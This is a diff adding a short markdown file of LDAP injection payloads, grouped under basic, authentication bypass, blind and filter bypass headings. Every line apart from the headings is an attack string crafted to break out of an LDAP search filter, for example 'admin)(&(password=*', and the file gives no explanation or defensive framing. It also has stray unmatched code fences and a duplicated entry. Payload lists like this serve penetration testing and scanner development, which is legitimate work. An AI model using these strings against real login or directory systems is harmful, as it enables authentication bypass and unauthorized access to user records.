@@ -1,0 +1,19 @@
+# LDAP Injection Payloads
+
+## Basic
+*)(uid=*))(|(uid=*
+*)(password=*
+
+## Authentication Bypass
+admin)(&(password=*
+*)(uid=*
+)(&(password=*
+
+## Blind LDAP
+*)(objectClass=*
+*)(objectClass=*
+```
+
+## Filter Bypass
+admin)(&(cn=*
+```
